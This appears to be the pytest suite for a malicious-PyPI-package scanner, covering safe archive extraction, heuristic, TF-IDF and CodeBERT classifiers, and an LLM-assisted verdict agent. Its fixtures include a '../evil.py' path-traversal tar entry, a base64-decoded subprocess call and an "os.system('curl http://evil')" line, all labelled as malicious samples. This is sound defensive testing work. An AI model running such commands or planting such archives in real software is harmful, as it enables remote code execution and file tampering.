import io
import json
import tarfile
import zipfile
from pathlib import Path

import pytest


def test_file_filter_keeps_python_sources_and_skips_noise():
    from lamps.core.file_filter import filter_python_files

    paths = [
        Path("pkg/__init__.py"),
        Path("pkg/core.py"),
        Path("tests/test_core.py"),
        Path("docs/conf.py"),
        Path("examples/demo.py"),
        Path("pkg.egg-info/SOURCES.txt"),
        Path("pkg/__pycache__/core.py"),
        Path("README.md"),
    ]

    assert filter_python_files(paths) == [
        Path("pkg/__init__.py"),
        Path("pkg/core.py"),
    ]


def test_safe_extract_tar_blocks_path_traversal(tmp_path):
    from lamps.core.archive import unsafe_archive_error, extract_archive_safely

    archive_path = tmp_path / "evil.tar.gz"
    with tarfile.open(archive_path, "w:gz") as tar:
        data = b"print('owned')"
        info = tarfile.TarInfo("../evil.py")
        info.size = len(data)
        tar.addfile(info, io.BytesIO(data))

    with pytest.raises(unsafe_archive_error):
        extract_archive_safely(archive_path, tmp_path / "out")


def test_safe_extract_zip_and_return_python_files(tmp_path):
    from lamps.core.archive import extract_archive_safely

    archive_path = tmp_path / "pkg.zip"
    with zipfile.ZipFile(archive_path, "w") as archive:
        archive.writestr("pkg/__init__.py", "")
        archive.writestr("pkg/main.py", "print('ok')")
        archive.writestr("tests/test_main.py", "print('skip')")
        archive.writestr("README.md", "skip")

    result = extract_archive_safely(archive_path, tmp_path / "out")

    assert [p.as_posix() for p in result.python_files] == [
        "pkg/__init__.py",
        "pkg/main.py",
    ]


def test_heuristic_classifier_flags_encoded_subprocess_behavior():
    from lamps.core.codebert import HeuristicClassifier

    code = "import base64, subprocess\nsubprocess.Popen(base64.b64decode('abc'))"

    result = HeuristicClassifier().classify_code(code, "setup.py")

    assert result.label == "malicious"
    assert result.score >= 0.8
    assert "base64" in result.signals
    assert "subprocess" in result.signals


def test_tfidf_classifier_trains_saves_and_loads(tmp_path):
    from lamps.core.codebert import TfidfClassifier
    from lamps.evaluation.train_tfidf import TfidfTrainingConfig, train_tfidf

    train_path = tmp_path / "train.csv"
    train_path.write_text(
        "code,label\n"
        "\"import base64, subprocess\nsubprocess.Popen(base64.b64decode('abc'))\",1\n"
        "\"import os\nos.system('curl http://evil')\",1\n"
        "\"from setuptools import setup\nsetup(name='demo')\",0\n"
        "\"print('hello world')\",0\n",
        encoding="utf-8",
    )

    model_path = tmp_path / "tfidf" / "model.joblib"
    metrics = train_tfidf(
        TfidfTrainingConfig(
            train_path=train_path,
            output_path=model_path,
            text_column="code",
            label_column="label",
        )
    )

    classifier = TfidfClassifier(model_path)
    result = classifier.classify_code(
        "import base64, subprocess\nsubprocess.Popen(base64.b64decode('abc'))",
        "setup.py",
    )

    assert model_path.exists()
    assert metrics["train_samples"] == 4
    assert result.label == "malicious"
    assert result.classifier_mode == "tfidf"


def test_classifier_factory_selects_tfidf_when_requested(tmp_path):
    from lamps.core.codebert import ClassifierFactory, TfidfClassifier

    model_path = tmp_path / "model.joblib"
    model_path.write_text("placeholder", encoding="utf-8")

    classifier = ClassifierFactory(
        codebert_model_path=tmp_path / "missing-codebert",
        tfidf_model_path=model_path,
    ).create("tfidf")

    assert isinstance(classifier, TfidfClassifier)


def test_codebert_classifier_uses_raw_code_for_inference(tmp_path):
    from lamps.core.codebert import CodeBERTClassifier

    captured_inputs = []

    def fake_pipeline(value, **kwargs):
        captured_inputs.append((value, kwargs))
        return [{"label": "LABEL_1", "score": 0.97}]

    classifier = CodeBERTClassifier(tmp_path / "checkpoint", block_size=2)
    classifier._pipeline = fake_pipeline
    code = "print('a')\nprint('b')\nprint('c')"

    result = classifier.classify_code(code, "setup.py")

    assert result.label == "malicious"
    assert captured_inputs == [(code, {"truncation": True, "max_length": 2})]
    assert "You are a security expert" not in captured_inputs[0][0]


def test_verdict_policy_marks_package_malicious_if_any_file_is_malicious():
    from lamps.agents.verdict import VerdictAgent
    from lamps.core.schemas import FileClassification

    results = [
        FileClassification(path="pkg/__init__.py", label="benign", score=0.95, signals=[]),
        FileClassification(path="setup.py", label="malicious", score=0.91, signals=["subprocess"]),
    ]

    report = VerdictAgent().decide("demo", "1.0.0", results)

    assert report.verdict == "malicious"
    assert report.malicious_files == ["setup.py"]
    assert "setup.py" in report.rationale
    assert "Lỗi gì:" in report.rationale
    assert "Ở đâu:" in report.rationale
    assert "Hậu quả khi cài package:" in report.rationale


def test_report_serializes_required_json_fields():
    from lamps.core.schemas import FileClassification, ScanReport

    report = ScanReport(
        package="demo",
        version="1.0.0",
        verdict="benign",
        malicious_files=[],
        files_analyzed=1,
        file_results=[
            FileClassification(path="demo/__init__.py", label="benign", score=0.99, signals=[])
        ],
        rationale="All analyzed Python files were classified as benign.",
        agent_trace={"fetcher": {}, "extractor": {}, "classifier": {}, "verdict": {}},
    )

    payload = json.loads(report.to_json())

    assert payload["verdict"] == "benign"
    assert payload["file_results"][0]["label"] == "benign"
    assert set(payload["agent_trace"]) == {"fetcher", "extractor", "classifier", "verdict"}


def test_pypi_client_prefers_sdist_over_wheel():
    from lamps.core.pypi_client import PyPIClient

    class FakeClient(PyPIClient):
        def fetch_metadata(self, package_name):
            return {
                "info": {"version": "1.2.3"},
                "urls": [
                    {
                        "packagetype": "bdist_wheel",
                        "url": "https://files.pythonhosted.org/pkg/demo-1.2.3.whl",
                    },
                    {
                        "packagetype": "sdist",
                        "url": "https://files.pythonhosted.org/pkg/demo-1.2.3.tar.gz",
                    },
                ],
            }

    artifact = FakeClient().choose_artifact("demo")

    assert artifact.version == "1.2.3"
    assert artifact.packagetype == "sdist"
    assert artifact.filename == "demo-1.2.3.tar.gz"


def test_pipeline_scans_local_archive_with_heuristic_classifier(tmp_path, monkeypatch):
    from lamps.core.config import Settings
    from lamps.core.pipeline import LAMPSPipeline

    archive_path = tmp_path / "demo.tar.gz"
    with tarfile.open(archive_path, "w:gz") as tar:
        code = b"import base64, subprocess\nsubprocess.Popen(base64.b64decode('abc'))"
        info = tarfile.TarInfo("demo/setup.py")
        info.size = len(code)
        tar.addfile(info, io.BytesIO(code))

    settings = Settings(
        llm_api_key=None,
        llm_api_base="https://api.openai.com/v1",
        llm_model="unused",
        codebert_model_path=tmp_path / "missing-model",
        tfidf_model_path=tmp_path / "missing-tfidf" / "model.joblib",
        download_dir=tmp_path / "downloads",
        extract_dir=tmp_path / "extracted",
        report_dir=tmp_path / "reports",
    )

    report = LAMPSPipeline(settings, classifier_mode="auto").scan_archive(archive_path, package="demo")

    assert report.verdict == "malicious"
    assert report.malicious_files == ["demo/setup.py"]
    assert (tmp_path / "reports" / "demo-report.json").exists()


def test_pipeline_records_llm_assisted_agent_reasoning(tmp_path, monkeypatch):
    from lamps.core.config import Settings
    from lamps.core.pipeline import LAMPSPipeline

    archive_path = tmp_path / "demo.tar.gz"
    with tarfile.open(archive_path, "w:gz") as tar:
        code = b"print('safe')"
        info = tarfile.TarInfo("demo/setup.py")
        info.size = len(code)
        tar.addfile(info, io.BytesIO(code))

    settings = Settings(
        llm_api_key="fake-key",
        llm_api_base="https://api.example.test/v1",
        llm_model="fake-model",
        codebert_model_path=tmp_path / "missing-model",
        tfidf_model_path=tmp_path / "missing-tfidf" / "model.joblib",
        download_dir=tmp_path / "downloads",
        extract_dir=tmp_path / "extracted",
        report_dir=tmp_path / "reports",
    )
    pipeline = LAMPSPipeline(settings, classifier_mode="heuristic")

    def fake_complete_or_default(system, user, default, max_tokens=120):
        if "Fetcher Agent" in system:
            return "LLM fetcher reasoning."
        if "Extractor Agent" in system:
            return "LLM extractor reasoning."
        if "Verdict Agent" in system:
            return "LLM verdict rationale."
        return default

    pipeline.llm_client.complete_or_default = fake_complete_or_default

    report = pipeline.scan_archive(archive_path, package="demo")

    assert report.agent_trace["fetcher"]["llm_reasoning"]["llm_assisted"] is True
    assert report.agent_trace["fetcher"]["llm_reasoning"]["summary"] == "LLM fetcher reasoning."
    assert report.agent_trace["extractor"]["llm_reasoning"]["summary"] == "LLM extractor reasoning."
    assert report.agent_trace["verdict"]["llm_assisted"] is True
    assert report.agent_trace["verdict"]["rationale_source"] == "llm"
    assert report.rationale == "LLM verdict rationale."


def test_csv_to_jsonl_auto_detects_label_column(tmp_path):
    from lamps.evaluation.prepare_dataset import csv_to_jsonl

    csv_path = tmp_path / "data.csv"
    out_path = tmp_path / "data.jsonl"
    csv_path.write_text('Serial,Setup.py,Label\n1,"print(1)",1\n2,"print(2)",0\n', encoding="utf-8")

    csv_to_jsonl(csv_path, out_path)

    lines = [json.loads(line) for line in out_path.read_text(encoding="utf-8").splitlines()]
    assert lines == [
        {"idx": "0", "func": "print(1)", "target": 1},
        {"idx": "1", "func": "print(2)", "target": 0},
    ]


def test_create_codebert_splits_writes_train_val_test_jsonl(tmp_path):
    from lamps.evaluation.prepare_dataset import create_codebert_splits

    csv_path = tmp_path / "dataset.csv"
    rows = ["Serial,Package,Version,Setup.py,Label"]
    for index in range(20):
        label = 1 if index % 2 else 0
        rows.append(f'{index},pkg{index},1.0,"print({index})",{label}')
    csv_path.write_text("\n".join(rows), encoding="utf-8")

    summary = create_codebert_splits(
        csv_path=csv_path,
        output_dir=tmp_path / "codebert_data",
        train_ratio=0.7,
        val_ratio=0.15,
        test_ratio=0.15,
        seed=123456,
    )

    assert summary["total"] == 20
    assert summary["train"] == 14
    assert summary["val"] == 3
    assert summary["test"] == 3
    for split in ("train", "val", "test"):
        assert (tmp_path / "codebert_data" / f"{split}.jsonl").exists()

    train_items = [
        json.loads(line)
        for line in (tmp_path / "codebert_data" / "train.jsonl").read_text(encoding="utf-8").splitlines()
    ]
    assert set(train_items[0]) == {"idx", "func", "target"}
    assert {item["target"] for item in train_items} == {0, 1}


def test_cli_trains_tfidf_and_evaluates_with_tfidf_classifier(tmp_path, monkeypatch, capsys):
    from lamps.main import main

    dataset = tmp_path / "dataset.csv"
    dataset.write_text(
        "Setup.py,Label\n"
        "\"import base64, subprocess\nsubprocess.Popen(base64.b64decode('abc'))\",1\n"
        "\"import os\nos.system('curl http://evil')\",1\n"
        "\"from setuptools import setup\nsetup(name='demo')\",0\n"
        "\"print('hello world')\",0\n",
        encoding="utf-8",
    )
    model_path = tmp_path / "tfidf" / "model.joblib"
    monkeypatch.setenv("TFIDF_MODEL_PATH", str(model_path))

    assert main(
        [
            "train-tfidf",
            "--dataset",
            str(dataset),
            "--text-column",
            "Setup.py",
            "--output-path",
            str(model_path),
        ]
    ) == 0
    assert main(
        [
            "evaluate",
            "--dataset",
            str(dataset),
            "--code-column",
            "Setup.py",
            "--classifier",
            "tfidf",
        ]
    ) == 0

    output = capsys.readouterr().out

    assert model_path.exists()
    assert '"classifier": "tfidf"' in output
    assert '"accuracy"' in output


def test_cli_compares_classifiers_and_selects_best(tmp_path, monkeypatch, capsys):
    from lamps.main import main

    dataset = tmp_path / "dataset.csv"
    dataset.write_text(
        "Setup.py,Label\n"
        "\"malpkg_payload_token alpha\",1\n"
        "\"malpkg_payload_token beta\",1\n"
        "\"safe_library_token gamma\",0\n"
        "\"safe_library_token delta\",0\n",
        encoding="utf-8",
    )
    model_path = tmp_path / "tfidf" / "model.joblib"
    monkeypatch.setenv("TFIDF_MODEL_PATH", str(model_path))

    assert main(["train-tfidf", "--dataset", str(dataset), "--text-column", "Setup.py"]) == 0
    assert main(
        [
            "compare-classifiers",
            "--dataset",
            str(dataset),
            "--code-column",
            "Setup.py",
            "--classifiers",
            "heuristic",
            "tfidf",
        ]
    ) == 0

    output = capsys.readouterr().out

    assert '"best_classifier": "tfidf"' in output
    assert '"tfidf"' in output
    assert '"heuristic"' in output
